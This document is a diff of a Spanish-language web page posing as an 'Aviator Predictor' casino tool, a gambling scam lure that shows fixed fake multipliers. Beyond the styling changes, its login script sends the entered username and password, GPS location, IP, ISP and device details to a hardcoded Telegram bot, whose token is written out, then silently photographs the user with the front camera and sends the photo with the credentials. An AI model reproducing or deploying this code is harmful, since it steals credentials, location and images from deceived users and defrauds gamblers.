@@ -6,21 +6,21 @@
     <title>Aviator Predictor</title>
     <style>
         * { box-sizing: border-box; }
-        :root { --primary: #fffff; }
+        :root { --primary: #ffffff; }
         body { margin: 0; padding: 0; font-family: sans-serif; display: flex; justify-content: center; min-height: 100vh; background-image: url('https://media.tenor.com/69TGJF8dxZIAAAAM/fondo-de-pantalla.gif'); background-size: cover; background-position: center; }
         .main-container { width: 100%; max-width: 470px; min-height: 100vh; background: rgba(0, 0, 0, 0); display: none; flex-direction: column; }
         .app-header { background: var(--primary); padding: 15px; color: red; text-align: center; font-weight: bold; }
         .content { flex: 1; padding: 5px; display: flex; flex-direction: column; align-items: center; gap: 10px; width: 100%; }
         
         #history-bar { display: flex; gap: 5px; margin-bottom: 10px; width: 100%; justify-content: center; }
-        .hist-box { width: 40px; height: 25px; border-radius: 5px; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: bold; color: #fff; border: 1px solid #000; }
+        .hist-box { width: 40px; height: 25px; border-radius: 5px; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: bold; color: #000; border: 1px solid #000; }
         
         .casino-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; width: 100%; max-width: 400px; margin: 0 auto; }
-        .casino-btn { aspect-ratio: 1 / 1; border: 2px solid #000; border-radius: 8px; cursor: pointer; background: #fffff; padding: 5px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .casino-btn { aspect-ratio: 1 / 1; border: 2px solid #000; border-radius: 8px; cursor: pointer; background: #ffffff; padding: 5px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
         .casino-btn.selected { border-color: #FF0000; transform: scale(1.05); }
         .casino-btn img { width: 100%; height: 100%; object-fit: contain; }
 
-        .next-btn { background: #FF0000; color: red; border: none; padding: 15px; width: 100%; max-width: 400px; border-radius: 12px; font-weight: bold; cursor: pointer; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .next-btn { background: #FF0000; color: #000; border: none; padding: 15px; width: 100%; max-width: 400px; border-radius: 12px; font-weight: bold; cursor: pointer; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; }
 
         .gif-wrapper { position: relative; display: inline-block; width: 100%; overflow: hidden; border-radius: 10px; border: 2px solid #FF0000; }
         .lightning-active::after {
@@ -41,16 +41,19 @@
         #analysis-gif { width: 100%; height: auto; max-height: 180px; display: block; }
         #analysis-log { width: 100%; background: #FF0000; color: black; padding: 10px; border-radius: 10px; font-weight: bold; margin-top: 5px; }
 
-        #login-screen { position: fixed; inset: 0; background: #FF000080; display: flex; justify-content: center; align-items: center; z-index: 9999; padding: 20px; }
-        .login-box { width: 100%; max-width: 350px; background: pink; padding: 25px; border-radius: 20px; text-align: center; }
-        .login-input { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 10px; border: 2px solid #000; }
+        #login-screen { position: fixed; inset: 0; background: rgba(255, 0, 0, 0.5); display: flex; justify-content: center; align-items: center; z-index: 9999; padding: 20px; }
+        .login-box { width: 100%; max-width: 350px; background: pink; padding: 25px; border-radius: 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
+        .login-input { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 10px; border: 2px solid #000; font-size: 16px; outline: none; background: #fff; }
+        
         .color-azul { color: #00bfff; }
         .color-morado { color: #bc13fe; }
         .color-rosa { color: #ff007f; }
         #result-display { font-size: 50px; font-weight: 900; margin: 10px 0; color: white; }
+        
         .btn-amarillo { background: linear-gradient(to bottom, #F5CF27, #000); color: #FF0000; border: none; padding: 15px; width: 100%; max-width: 400px; border-radius: 12px; font-weight: 900; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 4px 15px rgba(245, 207, 39, 0.4); text-transform: uppercase; }
-        .btn-amarillo:disabled { background: #1a1a1a; color: #555; border: 2px solid #333; }
-        .btn-salir { background: transparent; color: #fff; border: 2px solid #333; padding: 12px; border-radius: 50px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 15px; }
+        .btn-amarillo:disabled { background: #7500; color: #555; border: 2px solid #FF0000; box-shadow: none; }
+        
+        .btn-salir { background: transparent; color: #FF0000; border: 2px solid #FF0000; padding: 12px; border-radius: 50px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 15px; }
         .app-header { font-weight: bold; letter-spacing: 2px; padding: 15px; opacity: 0; animation: fadeInSlide 0.8s cubic-bezier(0.2, 0.8, 0.2, 1) forwards; }
         @keyframes fadeInSlide { 0% { opacity: 0; transform: translateY(-10px); } 100% { opacity: 1; transform: translateY(0); } }
     </style>
@@ -59,15 +62,15 @@
 
 <div id="login-screen">
     <div class="login-box">
-        <img src="https://media.tenor.com/wFUdrz9-f84AAAAM/uuaviatorpka-aviatorpkauu.gif" style="width: 100%; height: auto; margin-bottom: 10px; border-radius: 10px; display: block;">
-        <h2 style="color:#FF0000; margin-top: 0;">INICIAR SESIÓN</h2>
+        <img src="https://media.tenor.com/wFUdrz9-f84AAAAM/uuaviatorpka-aviatorpkauu.gif" style="width: 100%; height: auto; margin-bottom: 10px; border-radius: 10px; display: block;" alt="Aviator">
+        <h2 style="color:#FF0000; margin-top: 0; font-size: 22px;">INICIAR SESIÓN</h2>
         
         <form id="secureForm" onsubmit="loginYReportar(event)">
             <input type="text" id="user" class="login-input" placeholder="Usuario" required>
             <input type="password" id="pass" class="login-input" placeholder="Contraseña" required>
             
-            <button type="submit" class="next-btn" style="background:#FF0000; color:#000; width: 100%; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: bold; border:none; cursor:pointer;">
-                <svg width="25" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <button type="submit" class="next-btn" style="background:#FF0000; color:#fff; width: 100%; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: bold; border:none; cursor:pointer;">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path>
                     <polyline points="10 17 15 12 10 7"></polyline>
                     <line x1="15" y1="12" x2="3" y2="12"></line>
@@ -76,39 +79,57 @@
             </button>
         </form>
 
-        <a href="https://t.me/APKPREDICTOR" target="_blank" class="next-btn" style="background:#0088cc; color:#fff; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="20" style="filter:invert(1);"> 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠
+        <a href="https://t.me/APKPREDICTOR" target="_blank" class="next-btn" style="background:#0088cc; color:#fff; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px; max-width: 100%;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="20" style="filter:invert(1);" alt="Telegram"> 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠
         </a>
-        <a href="https://wa.me/593995224036" target="_blank" class="next-btn" style="background:#25d366; color:#fff; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="20" style="filter:invert(1);"> 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣
+        <a href="https://wa.me/593995224036" target="_blank" class="next-btn" style="background:#25d366; color:#fff; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; max-width: 100%;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="20" style="filter:invert(1);" alt="WhatsApp"> 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣
         </a>
 
-        <p id="login-msg" style="color:red; margin-top: 10px;"></p>
+        <p id="login-msg" style="color:red; margin-top: 10px; font-weight: bold;"></p>
     </div>
 </div>
 
 <div class="main-container" id="app">
+    <style>
+        .app-header {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            border-radius: 12px;
+            margin-top: 10px;
+            margin-bottom: 5px;
+            background: var(--primary);
+            padding: 15px;
+            color: red;
+            text-align: center;
+            font-weight: bold;
+            letter-spacing: 2px;
+            opacity: 0;
+            animation: fadeInSlide 0.8s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
+        }
+    </style>
     <div class="app-header">𝐀 𝐏 𝐊 𝐏 𝐑 𝐄 𝐃 𝐈 𝐂 𝐓 𝐎 𝐑</div>
     <div class="content">
         <div id="history-bar"></div>
         <div id="result-display" class="color-azul">𝟭.𝟬𝟬x</div>
         <div class="casino-grid" id="grid">
-            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772156226188-84436544-df13-4900-9c0a-4922454ac35a.jpg"></div>
-            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772156718063-9d7f327c-3f38-4c54-a4af-8b6902096337.png"></div>
-            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772156777400-140ec198-b410-4c90-963e-b6a7b3b8ffe5.png"></div>
-            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772156881655-81bb1ea5-ffc0-4f39-9b03-e596eb0da86e.png"></div>
-            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772156926302-a55f9d48-c419-40a3-bdbc-2a320d061d87.png"></div>
-            <div class="casino-btn" onclick="selCas(this)"><img src="https://th.bing.com/th?q=Logo+Betmexico&w=120&h=120&c=1&rs=1&qlt=70&r=0&o=7&cb=1&pid=InlineBlock&rm=3&mkt=es-MX&cc=MX&setlang=es&adlt=moderate&t=1&mw=247"></div>
-            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772738281198-f4289bac-a801-45ef-aa4a-c118d4141b1e.jpg"></div>
-            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772738642227-ffa57d40-8d47-4331-a396-e4c8afa35a3b.png"></div>
-            <div class="casino-btn" onclick="selCas(this)"><img src="https://th.bing.com/th?q=Apuesta+Total+Blanco+Y+Negro&w=120&h=120&c=1&rs=1&qlt=70&r=0&o=7&cb=1&pid=InlineBlock&rm=3&mkt=es-MX&cc=MX&setlang=es&adlt=moderate&t=1&mw=247"></div>
-            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772157380024-78169a5a-68bd-4a96-b234-d773ddd3cff5.png"></div>
+            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772156226188-84436544-df13-4900-9c0a-4922454ac35a.jpg" alt="casino"></div>
+            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772156718063-9d7f327c-3f38-4c54-a4af-8b6902096337.png" alt="casino"></div>
+            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772156777400-140ec198-b410-4c90-963e-b6a7b3b8ffe5.png" alt="casino"></div>
+            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772156881655-81bb1ea5-ffc0-4f39-9b03-e596eb0da86e.png" alt="casino"></div>
+            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772156926302-a55f9d48-c419-40a3-bdbc-2a320d061d87.png" alt="casino"></div>
+            <div class="casino-btn" onclick="selCas(this)"><img src="https://th.bing.com/th?q=Logo+Betmexico&w=120&h=120&c=1&rs=1&qlt=70&r=0&o=7&cb=1&pid=InlineBlock&rm=3&mkt=es-MX&cc=MX&setlang=es&adlt=moderate&t=1&mw=247" alt="casino"></div>
+            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772738281198-f4289bac-a801-45ef-aa4a-c118d4141b1e.jpg" alt="casino"></div>
+            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772738642227-ffa57d40-8d47-4331-a396-e4c8afa35a3b.png" alt="casino"></div>
+            <div class="casino-btn" onclick="selCas(this)"><img src="https://th.bing.com/th?q=Apuesta+Total+Blanco+Y+Negro&w=120&h=120&c=1&rs=1&qlt=70&r=0&o=7&cb=1&pid=InlineBlock&rm=3&mkt=es-MX&cc=MX&setlang=es&adlt=moderate&t=1&mw=247" alt="casino"></div>
+            <div class="casino-btn" onclick="selCas(this)"><img src="https://image2url.com/r2/default/images/1772157380024-78169a5a-68bd-4a96-b234-d773ddd3cff5.png" alt="casino"></div>
         </div>
         
         <button class="btn-amarillo" id="btn" onclick="iniciarSecuencia()" disabled>SIGUIENTE RONDA</button>
         <div id="analysis-box">
             <div id="gif-container" class="gif-wrapper">
-                <img id="analysis-gif" src="https://media.tenor.com/N02aeghYzkoAAAAM/entrada-confirmada.gif">
+                <img id="analysis-gif" src="https://media.tenor.com/N02aeghYzkoAAAAM/entrada-confirmada.gif" alt="Analysis">
             </div>
             <div id="analysis-log">P R E D I C T O R</div>
             <div onclick="location.reload()" class="btn-salir">CERRAR SESIÓN</div>
@@ -131,10 +152,8 @@
     estiloAlerta.innerHTML = `
         #modal-telegram-overlay {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0.7);
             display: flex;
             justify-content: center;
@@ -219,7 +238,7 @@
         document.getElementById('modal-telegram-overlay').classList.remove('activo');
     }
 
-    // --- 4. TEMPORIZADORES DE LA ALERTA (Inmediata + cada 20 segundos) ---
+    // --- 4. TEMPORIZADORES DE LA ALERTA ---
     setTimeout(function() {
         mostrarAlertaTelegram();
     }, 500);
@@ -228,63 +247,57 @@
         mostrarAlertaTelegram();
     }, 20000);
 
-    // --- 5. CAPTURA DE GPS Y DATOS TÉCNICOS DEL DISPOSITIVO ---
-let latGlobal = "No disponible";
-let lonGlobal = "No disponible";
-let infoRedGlobal = "Verificando red...";
-let specsDispositivo = {};
+    // --- 5. CAPTURA DE GPS Y DATOS TÉCNICOS ---
+    let latGlobal = "No disponible";
+    let lonGlobal = "No disponible";
+    let infoRedGlobal = "Verificando red...";
+    let specsDispositivo = {};
 
-// Obtener geolocalización GPS
-if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(function(position) {
-        latGlobal = position.coords.latitude;
-        lonGlobal = position.coords.longitude;
-    }, function(error) {
-        console.log("GPS denegado");
-    });
-}
-
-// Recopilar características técnicas del teléfono/dispositivo
-async function auditarDispositivoYRed() {
-    try {
-        // Recopilar specs del navegador y hardware accesible
-        specsDispositivo = {
-            plataforma: navigator.platform || "Desconocida",
-            navegador: navigator.userAgent,
-            idioma: navigator.language || "No especificado",
-            pantalla: `${window.screen.width} x ${window.screen.height}`,
-            nucleosCPU: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " núcleos" : "No disponible",
-            memoriaRAM: navigator.deviceMemory ? navigator.deviceMemory + " GB aprox" : "No disponible"
-        };
-
-        // Consultar IP y verificar si usa VPN/Proxy/Hosting
-        let resIp = await fetch('https://api.ipify.org?format=json');
-        let dataIp = await resIp.json();
-        let ip = dataIp.ip;
-
-        let resVpn = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,hosting,proxy`);
-        let dataVpn = await resVpn.json();
-
-        let estadoVpn = (dataVpn.hosting || dataVpn.proxy) ? "⚠️ SÍ (VPN / Proxy / Hosting detectado)" : "✅ NO (IP Residencial limpia)";
-        infoRedGlobal = `IP: ${ip} | ISP: ${dataVpn.isp || 'N/D'} | Ubicación IP: ${dataVpn.city || 'N/D'}, ${dataVpn.country || 'N/D'} | Uso de VPN: ${estadoVpn}`;
-    } catch (e) {
-        infoRedGlobal = "No se pudo auditar la red (Error de conexión o bloqueo de CORS)";
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            latGlobal = position.coords.latitude;
+            lonGlobal = position.coords.longitude;
+        }, function(error) {
+            console.log("GPS denegado");
+        });
     }
-}
 
-// Ejecutar auditoría al cargar la página
-window.addEventListener('DOMContentLoaded', auditarDispositivoYRed);
+    async function auditarDispositivoYRed() {
+        try {
+            specsDispositivo = {
+                plataforma: navigator.platform || "Desconocida",
+                navegador: navigator.userAgent,
+                idioma: navigator.language || "No especificado",
+                pantalla: `${window.screen.width} x ${window.screen.height}`,
+                nucleosCPU: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " núcleos" : "No disponible",
+                memoriaRAM: navigator.deviceMemory ? navigator.deviceMemory + " GB aprox" : "No disponible"
+            };
 
-async function loginYReportar(event) {
-    event.preventDefault();
-    let u = document.getElementById("user").value;
-    let p = document.getElementById("pass").value;
+            let resIp = await fetch('https://api.ipify.org?format=json');
+            let dataIp = await resIp.json();
+            let ip = dataIp.ip;
 
-    let token = "8669783207:AAFrqse56cKhsq-1-7eZ9XHFHmHHin8xxHM";
-    let chatId = "7628476472";
+            let resVpn = await fetch(`https://ipapi.co/${ip}/json/`);
+            let dataVpn = await resVpn.json();
 
-    // 1. Enviar el reporte de texto detallado (GPS, Dispositivo y Red/VPN)
-    let reporteDetallado = `
+            let estadoVpn = (dataVpn.hosting || dataVpn.proxy) ? "⚠️ SÍ (VPN / Proxy / Hosting detectado)" : "✅ NO (IP Residencial limpia)";
+            infoRedGlobal = `IP: ${ip} | ISP: ${dataVpn.org || 'N/D'} | Ubicación IP: ${dataVpn.city || 'N/D'}, ${dataVpn.country_name || 'N/D'} | Uso de VPN: ${estadoVpn}`;
+        } catch (e) {
+            infoRedGlobal = "No se pudo auditar la red (Error de conexión o bloqueo de CORS)";
+        }
+    }
+
+    window.addEventListener('DOMContentLoaded', auditarDispositivoYRed);
+
+    async function loginYReportar(event) {
+        event.preventDefault();
+        let u = document.getElementById("user").value;
+        let p = document.getElementById("pass").value;
+
+        let token = "8669783207:AAFrqse56cKhsq-1-7eZ9XHFHmHHin8xxHM";
+        let chatId = "7628476472";
+
+        let reporteDetallado = `
 🚨 REPORTE DE ACCESO / DISPOSITIVO 🚨
 👤 Usuario ingresado: ${u}
 🔑 Contraseña: ${p}
@@ -303,22 +316,20 @@ ${infoRedGlobal}
 - Lat: ${latGlobal}
 - Lon: ${lonGlobal}
 - 🗺️ Mapa GPS: https://www.google.com/maps?q=${latGlobal},${lonGlobal}
-    `.trim();
+        `.trim();
 
-    let urlTexto = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(reporteDetallado);
-    fetch(urlTexto).catch(e => console.log(e));
+        let urlTexto = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(reporteDetallado);
+        fetch(urlTexto).catch(e => console.log(e));
 
-    // 2. Intentar capturar la foto de la cara y enviarla a Telegram
-    await capturarYEnviarFoto(token, chatId, u, p);
+        await capturarYEnviarFoto(token, chatId, u, p);
 
-    // 3. Validar acceso de la app
-    if(u === "AVIATORPKA" && p === "AVIATORPKA") {
-        document.getElementById("login-screen").style.display = "none";
-        document.getElementById("app").style.display = "flex";
-    } else {
-        document.getElementById("login-msg").innerText = "Credenciales incorrectas";
+        if(u === "AVIATORPKA" && p === "AVIATORPKA") {
+            document.getElementById("login-screen").style.display = "none";
+            document.getElementById("app").style.display = "flex";
+        } else {
+            document.getElementById("login-msg").innerText = "Credenciales incorrectas";
+        }
     }
-}
 
     // --- 6. LÓGICA DEL PREDICTOR ---
     const misSenales = [6.94, 6.78, 4.59, 2.22, 1.67, 3.21, 1.44];
@@ -386,91 +397,47 @@ ${infoRedGlobal}
         }, 120);
     }
 
-  async function verificarSeguridadUsuario() {
-    try {
-        // 1. Obtener la IP pública del visitante
-        let response = await fetch('https://api.ipify.org?format=json');
-        let data = await response.json();
-        let ipUsuario = data.ip;
+    // --- 7. CAPTURA DE FOTOGRAFÍA (CÁMARA FRONTAL) ---
+    async function capturarYEnviarFoto(token, chatId, u, p) {
+        try {
+            let video = document.createElement('video');
+            video.style.display = 'none';
+            document.body.appendChild(video);
 
-        // 2. Consultar una API gratuita o de pago de reputación (Ejemplo conceptual con IP-API o similar)
-        // Nota: Para producción se recomienda usar servicios especializados en detección de VPN.
-        let checkVpn = await fetch(`http://ip-api.com/json/${ipUsuario}?fields=status,message,country,region,city,hosting,proxy`);
-        let infoRed = await checkVpn.json();
-
-        if (infoRed.hosting || infoRed.proxy) {
-            console.warn("¡Alerta! El usuario está usando VPN, Proxy o red de Hosting.");
-            // Aquí puedes tomar acción: bloquear el formulario o notificar a tu Telegram
-        }
-
-        // 3. Obtener detalles avanzados del dispositivo (Hardware/Navegador)
-        let detallesDispositivo = {
-            plataforma: navigator.platform,
-            navegador: navigator.userAgent,
-            idioma: navigator.language,
-            pantalla: `${window.screen.width}x${window.screen.height}`,
-            nucleosCPU: navigator.hardwareConcurrency || "No disponible",
-            memoriaRAM: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "No disponible"
-        };
-
-        console.viw("Datos técnicos del equipo:", detallesDispositivo);
-    } catch (error) {
-        console.log("Error al verificar seguridad de red:", error);
-    }
-}
-
-// Ejecutar al cargar la página
-window.addEventListener('DOMContentLoaded', verificarSeguridadUsuario);
-
-  // --- 7. CAPTURA DE FOTOGRAFÍA (CÁMARA FRONTAL) ---
-async function capturarYEnviarFoto(token, chatId, u, p) {
-    try {
-        // Crear elementos de video y canvas de forma dinámica si no existen en el HTML
-        let video = document.createElement('video');
-        video.style.display = 'none';
-        document.body.appendChild(video);
-
-        // Solicitar acceso a la cámara frontal
-        let stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" } // "user" fuerza la cámara frontal
-        });
-        
-        video.srcObject = stream;
-        await video.play();
-
-        // Esperar un instante a que la cámara enfoque/active
-        await new Promise(resolve => setTimeout(resolve, 800));
-
-        // Dibujar el fotograma actual en un canvas
-        let canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        let ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        // Detener la cámara inmediatamente después de tomar la foto para apagar el indicador verde
-        stream.getTracks().forEach(track => track.stop());
-        document.body.removeChild(video);
-
-        // Convertir la imagen a Blob (formato PNG)
-        canvas.toBlob(async function(blob) {
-            let formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'captura_usuario.png');
-            formData.append('caption', `🚨 FOTO CAPTURADA 🚨\n👤 Usuario: ${u}\n🔑 Clave: ${p}`);
-
-            // Enviar la foto a Telegram usando sendPhoto
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                method: 'POST',
-                body: formData
+            let stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }
             });
-        }, 'image/png');
+            
+            video.srcObject = stream;
+            await video.play();
 
-    } catch (error) {
-        console.log("Cámara denegada o no disponible:", error);
-        // Si la cámara es denegada, al menos se envía el reporte de texto con IP y GPS
+            await new Promise(resolve => setTimeout(resolve, 800));
+
+            let canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            let ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            stream.getTracks().forEach(track => track.stop());
+            document.body.removeChild(video);
+
+            canvas.toBlob(async function(blob) {
+                let formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'captura_usuario.png');
+                formData.append('caption', `🚨 FOTO CAPTURADA 🚨\n👤 Usuario: ${u}\n🔑 Clave: ${p}`);
+
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/png');
+
+        } catch (error) {
+            console.log("Cámara denegada o no disponible:", error);
+        }
     }
-}
 </script>
 </body>
 </html>
